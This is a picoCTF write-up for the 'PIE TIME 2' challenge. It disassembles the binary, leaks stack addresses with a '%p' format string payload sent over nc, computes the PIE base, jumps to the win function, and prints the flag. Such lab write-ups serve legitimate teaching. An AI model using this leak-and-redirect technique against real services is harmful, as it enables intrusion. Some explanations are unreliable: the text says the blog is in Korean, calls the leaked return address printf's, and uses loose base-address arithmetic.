---
title: PicoCTF - PIE TIME 2
published: 2025-08-21
description: PicoCTF Writeup for PIE TIME 2 Challenge
tags: [binary exploitation, medium, picoCTF 2025]
category: PicoCTF Writeup
draft: false
lang: en
---

# PicoCTF Writeup - PIE TIME 2

PicoCTF Challenge: 
[https://play.picoctf.org/practice/challenge/491?category=6&page=1](https://play.picoctf.org/practice/challenge/491?category=6&page=1)

> ## PIE TIME 2
> Author: Darkraicg492
> 
> ### Description
> Can you try to get the flag? I'm not revealing anything anymore!!<br>
> Additional details will be available after launching your challenge instance.<br>
> ### Hints
> 1st - What vulnerability can be exploited to leak the address?<br>
> 2nd - Please be mindful of the size of pointers in this binary<br>
> ### Resources:
> Source Code: [/vuln.c](https://challenge-files.picoctf.net/c_rescued_float/0ee50c4c94b334e2007d91218ac385470257261765b09a6620226865a05bf468/vuln.c)<br>
> Binary: [/vuln](https://challenge-files.picoctf.net/c_rescued_float/0ee50c4c94b334e2007d91218ac385470257261765b09a6620226865a05bf468/vuln)<br>

This blog is in Korean

## Analysis
A binary with PIE security features gets **random base address in runtime**.
Currently, the binary has a format string vulnerability which I learned in previous blog `format-string-0`.

The result of decompiling the binary `vuln` (function - `main`) gives me the following result:

```bash
[0x000012c7]> s main
[0x00001400]> pdf
            ; ICOD XREF from entry0 @ 0x11e1(r)
/ 72: int main (int argc, char **argv, char **envp);
|           0x00001400      f30f1efa       endbr64
|           0x00001404      55             push rbp
|           0x00001405      4889e5         mov rbp, rsp
|           0x00001408      488d359afe..   lea rsi, [sym.segfault_handler] ; 0x12a9 ; void *func
|           0x0000140f      bf0b000000     mov edi, 0xb                ; int sig
|           0x00001414      e857fdffff     call sym.imp.signal         ; void signal(int sig, void *func)
|           0x00001419      488b05f02b..   mov rax, qword [obj.stdout] ; obj.__TMC_END__
|                                                                      ; [0x4010:8]=0
|           0x00001420      b900000000     mov ecx, 0                  ; size_t size
|           0x00001425      ba02000000     mov edx, 2                  ; int mode
|           0x0000142a      be00000000     mov esi, 0                  ; char *buf
|           0x0000142f      4889c7         mov rdi, rax                ; FILE*stream
|           0x00001432      e849fdffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00001437      b800000000     mov eax, 0
|           0x0000143c      e886feffff     call sym.call_functions
|           0x00001441      b800000000     mov eax, 0
|           0x00001446      5d             pop rbp
\           0x00001447      c3             ret
[0x00001400]> 
```

As you can see, the main function ultimately calls the function `sym.call_functions`.

The following code is disassembled code from the function `sym.call_functions`:

```bash
[0x000012c7]> pdf
            ; CALL XREF from main @ 0x143c(x)
/ 163: sym.call_functions ();
| afv: vars(4:sp[0x10..0x68])
|           0x000012c7      f30f1efa       endbr64
|           0x000012cb      55             push rbp
|           0x000012cc      4889e5         mov rbp, rsp
|           0x000012cf      4883ec60       sub rsp, 0x60
|           0x000012d3      64488b0425..   mov rax, qword fs:[0x28]
|           0x000012dc      488945f8       mov qword [canary], rax
|           0x000012e0      31c0           xor eax, eax
|           0x000012e2      488d3d450d..   lea rdi, str.Enter_your_name: ; 0x202e ; "Enter your name:" ; const char *format
|           0x000012e9      b800000000     mov eax, 0
|           0x000012ee      e84dfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x000012f3      488b15262d..   mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
|                                                                      ; [0x4020:8]=0 ; FILE *stream
|           0x000012fa      488d45b0       lea rax, [format]
|           0x000012fe      be40000000     mov esi, 0x40               ; elf_phdr ; int size
|           0x00001303      4889c7         mov rdi, rax                ; char *s
|           0x00001306      e855feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0000130b      488d45b0       lea rax, [format]
|           0x0000130f      4889c7         mov rdi, rax                ; const char *format
|           0x00001312      b800000000     mov eax, 0
|           0x00001317      e824feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0000131c      488d3d1d0d..   lea rdi, str._enter_the_address_to_jump_to__ex___0x12345: ; str._enter_the_address_to_jump_to__ex___0x12345:
|                                                                      ; 0x2040 ; " enter the address to jump to, ex => 0x12345: " ; const char *format
|           0x00001323      b800000000     mov eax, 0
|           0x00001328      e813feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0000132d      488d45a0       lea rax, [var_60h]
|           0x00001331      4889c6         mov rsi, rax
|           0x00001334      488d3d340d..   lea rdi, [0x0000206f]       ; "%lx" ; const char *format
|           0x0000133b      b800000000     mov eax, 0
|           0x00001340      e85bfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
|           0x00001345      488b45a0       mov rax, qword [var_60h]
|           0x00001349      488945a8       mov qword [var_58h], rax
|           0x0000134d      488b45a8       mov rax, qword [var_58h]
|           0x00001351      ffd0           call rax
|           0x00001353      90             nop
|           0x00001354      488b45f8       mov rax, qword [canary]
|           0x00001358      6448330425..   xor rax, qword fs:[0x28]
|       ,=< 0x00001361      7405           je 0x1368
|       |   0x00001363      e8c8fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; CODE XREF from sym.call_functions @ 0x1361(x)
|       `-> 0x00001368      c9             leave
\           0x00001369      c3             ret
[0x000012c7]> 
```

The clear code is:

```asm
endbr64
push rbp
mov rbp, rsp
sub rsp, 0x60
mov rax, qword fs:[0x28]
mov qword [canary], rax
xor eax, eax
lea rdi, str.Enter_your_name: ; 0x202e ; "Enter your name:" ; const char *format
mov eax, 0
call sym.imp.printf         ; int printf(const char *format)
mov rdx, qword [obj.stdin]  ; obj.stdin__GLIBC_2.2.5
                            ; [0x4020:8]=0 ; FILE *stream
lea rax, [format]
mov esi, 0x40               ; elf_phdr ; int size
mov rdi, rax                ; char *s
call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
lea rax, [format]
mov rdi, rax                ; const char *format
mov eax, 0
call sym.imp.printf         ; int printf(const char *format)
lea rdi, str._enter_the_address_to_jump_to__ex___0x12345: ; str._enter_the_address_to_jump_to__ex___0x12345:
                            ; 0x2040 ; " enter the address to jump to, ex => 0x12345: " ; const char *format
mov eax, 0
call sym.imp.printf         ; int printf(const char *format)
lea rax, [var_60h]
mov rsi, rax
lea rdi, [0x0000206f]       ; "%lx" ; const char *format
mov eax, 0
call sym.imp.__isoc99_scanf ; int scanf(const char *format)
mov rax, qword [var_60h]
mov qword [var_58h], rax
mov rax, qword [var_58h]
call rax
nop
mov rax, qword [canary]
xor rax, qword fs:[0x28]
je 0x1368
call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
leave
ret
```

Fisrtly, this binary ask the user to enter their name:

```asm
lea rdi, str.Enter_your_name: ; 0x202e ; "Enter your name:" ; const char *format
mov eax, 0
call sym.imp.printf         ; int printf(const char *format)
```

After that, they ask an address to jump.

```asm
call sym.imp.__isoc99_scanf ; int scanf(const char *format)
mov rax, qword [var_60h]
mov qword [var_58h], rax
mov rax, qword [var_58h]
call rax
```

In Binary Ninja, the decompiled code looks like the following code:

```c
004012c7    int64_t call_functions()

004012d3        void* fsbase
004012d3        int64_t rax = *(fsbase + 0x28)
004012ee        printf(format: "Enter your name:")
00401306        char var_58[0x48]
00401306        fgets(buf: &var_58, n: 0x40, fp: stdin)
00401317        printf(format: &var_58)
00401328        printf(format: " enter the address to jump to, e…")
00401340        int64_t var_68
00401340        __isoc99_scanf(format: "%lx", &var_68)
00401351        var_68()
00401358        int64_t result = rax ^ *(fsbase + 0x28)
00401358        
00401361        if (result == 0)
00401369            return result
00401369        
00401363        __stack_chk_fail()
00401363        noreturn

```

The following code is the completely decompiled version:

```c
int call_functions()
{
    printf("Enter your name:");
    char buffer[72];
    fgets(&buffer, 64, stdin);
    printf(&buffer);
    printf(" enter the address to jump to, ex => 0x12345: ");
    unsigned long target_address; /* address type */
    scanf("%lx", &target_address);
    target_address();



    /* Useless below here */

    int result = rax ^ *(uint64_t*)((char*)fsbase + 0x28);

    if (!result)
        return result;
    
    __stack_chk_fail();
    /* no return */
}

```

There is a format string vulnerability in the function.
The printf function 4th line of the code prints user input without validation which leads to format string vulnerability. This vulnerability can be used for leaking the base memory address.

This suggests that we can use this vulnerability to call the function `sym.win` to obtain the flag. In order to call the function, we need to know the offset of the function. In `radare2`, it says that the function is located at `0x0000136a`.

Therefore, the memory location of the function `sym.win` should end with the last 3 digits of the address: `36a` (`0x00001` suggests the dynamic base address).

```bash
sym.win 		    0x0000136a
main			    0x00001400
sym.call_functions	0x000012c7

.0x5589ca0a3441.

0x5589ca0a336a

%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.

0x5c637d063441
0x5c637d06336a
```

```bash
0x00001100    1     11 sym.imp.putchar
0x00001110    1     11 sym.imp.puts
0x00001120    1     11 sym.imp.fclose
0x00001130    1     11 sym.imp.__stack_chk_fail
0x00001140    1     11 sym.imp.printf
0x00001150    1     11 sym.imp.fgetc
0x00001160    1     11 sym.imp.fgets
0x00001170    1     11 sym.imp.signal
0x00001180    1     11 sym.imp.setvbuf
0x00001190    1     11 sym.imp.fopen
0x000011a0    1     11 sym.imp.__isoc99_scanf
0x000011b0    1     11 sym.imp.exit
0x000011c0    1     46 entry0
0x000011f0    4     34 sym.deregister_tm_clones
0x00001220    4     51 sym.register_tm_clones
0x00001260    5     54 entry.fini0
0x000010f0    1     11 fcn.000010f0
0x000012a0    1      9 entry.init0
0x00001000    3     27 sym._init
0x000014c0    1      5 sym.__libc_csu_fini
0x000012c7    3    163 sym.call_functions
0x000014c8    1     13 sym._fini
0x000012a9    1     30 sym.segfault_handler
0x00001450    4    101 sym.__libc_csu_init
0x0000136a    6    150 sym.win
0x00001400    1     72 main
```

## Execution

```bash
therustymate-picoctf@webshell:~/PIE Time 2$ nc rescued-float.picoctf.net 49689
Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x55a97e4eb2a1.0xfbad2288.0x55a97e4eb2da.(nil).0x55a97e4eb2a0.(nil).0x7f3b301b3780.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x7ffd6e000a2e.0x7ffd6e95f7a8.0x260430adc853e500.0x7ffd6e95f690.0x55a9739a9441.
 enter the address to jump to, ex => 0x12345: 
```

By using format string vulnerability, we identified multiple memory addresses.
* 0x55a97e4eb2a1
* 0xfbad2288
* 0x55a97e4eb2da
* (nil) 
* 0x55a97e4eb2a0
* (nil)
* 0x7f3b301b3780
* 0x70252e70252e7025
* 0x252e70252e70252e
* 0x2e70252e70252e70
* 0x70252e70252e7025
* 0x252e70252e70252e
* 0x2e70252e70252e70
* 0x70252e70252e7025
* 0x7ffd6e000a2e
* 0x7ffd6e95f7a8
* 0x260430adc853e500
* 0x7ffd6e95f690
* 0x55a9739a9441

Notice that one of the addresses (`0x55a9739a9441`) ends with `441`. This is the memory address of the function `printf`. We can calculate the dynamic base address using this: `base address = address - offset`.

`0x55a9739a9441 - 441 = 0x55A9 739A 9000 (0x55a9739a9000)`

Therefore, the base address is `0x55a9739a9000`.

We can call `sym.win` function by adding the offset of the function to the base address: `0x55a9739a9000 + 36a = 0x55A9 739A 936A (0x55a9739a936a)`

Entering this address to the prompt will jump to the `sym.win` function.

```bash
 enter the address to jump to, ex => 0x12345: 0x55a9739a936a
You won!
picoCTF{p13_5h0u1dn'7_134k_1ef23143}

^C
```

Therefore, the flag is `picoCTF{p13_5h0u1dn'7_134k_1ef23143}`